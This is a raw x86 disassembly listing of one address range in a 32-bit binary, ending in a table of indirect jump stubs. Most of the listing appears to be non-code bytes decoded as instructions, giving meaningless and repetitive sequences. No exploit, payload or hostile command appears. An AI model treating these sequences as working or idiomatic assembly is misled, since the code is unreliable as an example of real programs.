  41d8c1:	xor    DWORD PTR [edx+0x28],ebp
  41d8c4:	js     0x41d8b6
  41d8c6:	or     BYTE PTR [eax-0x18],dl
  41d8c9:	xor    eax,0xb2fffd0f
  41d8ce:	inc    esp
  41d8cf:	add    al,0x8b
  41d8d1:	cmp    al,0xd5
  41d8d3:	ja     0x41d916
  41d8d5:	xor    DWORD PTR [edx+0xb5bd5e7],edi
  41d8db:	std    
  41d8dc:	test   DWORD PTR [ecx-0x6b],esi
  41d8df:	add    esi,DWORD PTR [ebx]
  41d8e1:	jno    0x41d902
  41d8e3:	sub    cl,BYTE PTR [ebx+0x4177e50c]
  41d8e9:	xor    DWORD PTR [eax-0x324dfb3c],ecx
  41d8ef:	aaa    
  41d8f0:	js     0x41d962
  41d8f2:	or     DWORD PTR [eax],eax
  41d8f4:	je     0x41d8f6
  41d8f6:	cmp    BYTE PTR [eax+0x14],ch
  41d8f9:	js     0x41d96b
  41d8fb:	or     DWORD PTR [edi-0x17fab2bc],eax
  41d901:	pop    ebp
  41d902:	or     al,0xb
  41d904:	std    
  41d905:	mov    ebx,DWORD PTR [esi*4-0x48cebe89]
  41d90c:	shl    BYTE PTR [ebx],0xf1
  41d90f:	jle    0x41d8f4
  41d911:	pop    ebp
  41d912:	repnz cmp eax,0x931cccc
  41d918:	add    BYTE PTR [eax],al
  41d91a:	xor    DWORD PTR [ecx],ecx
  41d91c:	add    BYTE PTR [eax],al
  41d91e:	xor    DWORD PTR [ecx],ecx
  41d920:	add    BYTE PTR [eax],al
  41d922:	xor    DWORD PTR [ecx],ecx
  41d924:	add    BYTE PTR [eax],al
  41d926:	xor    DWORD PTR [ecx],ecx
  41d928:	add    BYTE PTR [eax],al
  41d92a:	xor    DWORD PTR [ecx],ecx
  41d92c:	add    BYTE PTR [eax],al
  41d92e:	xor    DWORD PTR [ecx],ecx
  41d930:	add    BYTE PTR [eax],al
  41d932:	xor    DWORD PTR [ecx],ecx
  41d934:	add    BYTE PTR [eax],al
  41d936:	xor    DWORD PTR [ecx],ecx
  41d938:	add    BYTE PTR [eax],al
  41d93a:	xor    DWORD PTR [ecx],ecx
  41d93c:	add    BYTE PTR [eax],al
  41d93e:	xor    DWORD PTR [ecx],ecx
  41d940:	add    BYTE PTR [eax],al
  41d942:	xor    DWORD PTR [ecx],ecx
  41d944:	add    BYTE PTR [eax],al
  41d946:	xor    DWORD PTR [ecx],ecx
  41d948:	add    BYTE PTR [eax],al
  41d94a:	xor    DWORD PTR [ecx],ecx
  41d94c:	add    BYTE PTR [eax],al
  41d94e:	xor    DWORD PTR [ecx],ecx
  41d950:	add    BYTE PTR [eax],al
  41d952:	xor    DWORD PTR [ecx],ecx
  41d954:	add    BYTE PTR [eax],al
  41d956:	xor    DWORD PTR [ecx],ecx
  41d958:	add    BYTE PTR [eax],al
  41d95a:	add    BYTE PTR [ecx],dh
  41d95c:	or     DWORD PTR [eax],eax
  41d95e:	add    BYTE PTR [ecx],dh
  41d960:	or     DWORD PTR [eax],eax
  41d962:	add    BYTE PTR [ecx],dh
  41d964:	or     DWORD PTR [eax],eax
  41d966:	add    BYTE PTR [ecx],dh
  41d968:	or     DWORD PTR [eax],eax
  41d96a:	add    BYTE PTR [ecx],dh
  41d96c:	or     DWORD PTR [eax],eax
  41d96e:	add    BYTE PTR [ecx],dh
  41d970:	or     DWORD PTR [eax],eax
  41d972:	add    BYTE PTR [ecx],dh
  41d974:	or     DWORD PTR [eax],eax
  41d976:	add    BYTE PTR [ecx],dh
  41d978:	or     DWORD PTR [eax],eax
  41d97a:	add    BYTE PTR [ecx],dh
  41d97c:	or     DWORD PTR [eax],eax
  41d97e:	add    BYTE PTR [ecx],dh
  41d980:	or     DWORD PTR [eax],eax
  41d982:	add    BYTE PTR [ecx],dh
  41d984:	or     DWORD PTR [eax],eax
  41d986:	add    BYTE PTR [ecx],dh
  41d988:	or     DWORD PTR [eax],eax
  41d98a:	add    BYTE PTR [ecx],dh
  41d98c:	or     DWORD PTR [eax],eax
  41d98e:	add    BYTE PTR [ecx],dh
  41d990:	or     DWORD PTR [eax],eax
  41d992:	add    BYTE PTR [ecx],dh
  41d994:	or     DWORD PTR [eax],eax
  41d996:	add    BYTE PTR [ecx],dh
  41d998:	or     DWORD PTR [eax],eax
  41d99a:	add    BYTE PTR [ecx],dh
  41d99c:	or     DWORD PTR [eax],eax
  41d99e:	add    BYTE PTR [ecx],dh
  41d9a0:	or     DWORD PTR [eax],eax
  41d9a2:	add    BYTE PTR [ecx],dh
  41d9a4:	or     DWORD PTR [eax],eax
  41d9a6:	add    BYTE PTR [ecx],dh
  41d9a8:	or     DWORD PTR [eax],eax
  41d9aa:	add    BYTE PTR [ecx],dh
  41d9ac:	or     DWORD PTR [eax],eax
  41d9ae:	add    BYTE PTR [ecx],dh
  41d9b0:	or     DWORD PTR [eax],eax
  41d9b2:	add    BYTE PTR [ecx],dh
  41d9b4:	or     DWORD PTR [eax],eax
  41d9b6:	add    BYTE PTR [ecx],dh
  41d9b8:	or     DWORD PTR [eax],eax
  41d9ba:	add    BYTE PTR [ecx],dh
  41d9bc:	or     DWORD PTR [eax],eax
  41d9be:	add    BYTE PTR [eax],al
  41d9c0:	xor    DWORD PTR [ecx],ecx
  41d9c2:	add    BYTE PTR [eax],al
  41d9c4:	xor    DWORD PTR [ecx],ecx
  41d9c6:	add    BYTE PTR [eax],al
  41d9c8:	xor    DWORD PTR [ecx],ecx
  41d9ca:	add    BYTE PTR [eax],al
  41d9cc:	xor    DWORD PTR [ecx],ecx
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	xor    DWORD PTR [ecx],ecx
  41d9d2:	add    BYTE PTR [eax],al
  41d9d4:	xor    DWORD PTR [ecx],ecx
  41d9d6:	add    BYTE PTR [eax],al
  41d9d8:	xor    DWORD PTR [ecx],ecx
  41d9da:	add    BYTE PTR [eax],al
  41d9dc:	xor    DWORD PTR [ecx],ecx
  41d9de:	add    BYTE PTR [eax],al
  41d9e0:	xor    DWORD PTR [ecx],ecx
  41d9e2:	add    BYTE PTR [eax],al
  41d9e4:	xor    DWORD PTR [ecx],ecx
  41d9e6:	add    BYTE PTR [eax],al
  41d9e8:	xor    DWORD PTR [ecx],ecx
  41d9ea:	add    BYTE PTR [eax],al
  41d9ec:	xor    DWORD PTR [ecx],ecx
  41d9ee:	add    BYTE PTR [eax],al
  41d9f0:	xor    DWORD PTR [ecx],ecx
  41d9f2:	add    BYTE PTR [eax],al
  41d9f4:	xor    DWORD PTR [ecx],ecx
  41d9f6:	add    BYTE PTR [eax],al
  41d9f8:	xor    DWORD PTR [ecx],ecx
  41d9fa:	add    BYTE PTR [eax],al
  41d9fc:	xor    DWORD PTR [ecx],ecx
  41d9fe:	add    BYTE PTR [eax],al
  41da00:	xor    DWORD PTR [ecx],ecx
  41da02:	add    BYTE PTR [eax],al
  41da04:	xor    DWORD PTR [ecx],ecx
  41da06:	add    BYTE PTR [eax],al
  41da08:	xor    DWORD PTR [ecx],ecx
  41da0a:	add    BYTE PTR [eax],al
  41da0c:	xor    DWORD PTR [ecx],ecx
  41da0e:	add    BYTE PTR [eax],al
  41da10:	xor    DWORD PTR [ecx],ecx
  41da12:	add    BYTE PTR [eax],al
  41da14:	xor    DWORD PTR [ecx],ecx
  41da16:	add    BYTE PTR [eax],al
  41da18:	xor    DWORD PTR [ecx],ecx
  41da1a:	add    BYTE PTR [eax],al
  41da1c:	xor    DWORD PTR [ecx],ecx
  41da1e:	add    BYTE PTR [eax],al
  41da20:	xor    DWORD PTR [ecx],ecx
  41da22:	add    BYTE PTR [eax],al
  41da24:	add    bh,bh
  41da26:	and    eax,0x41f0c8
  41da2b:	jmp    DWORD PTR ds:0x41f0cc
  41da31:	jmp    DWORD PTR ds:0x41f0d0
  41da37:	jmp    DWORD PTR ds:0x41f0d4
  41da3d:	jmp    DWORD PTR ds:0x41f0d8
  41da43:	jmp    DWORD PTR ds:0x41f0dc
  41da49:	jmp    DWORD PTR ds:0x41f0e4
  41da4f:	jmp    DWORD PTR ds:0x41f0e8
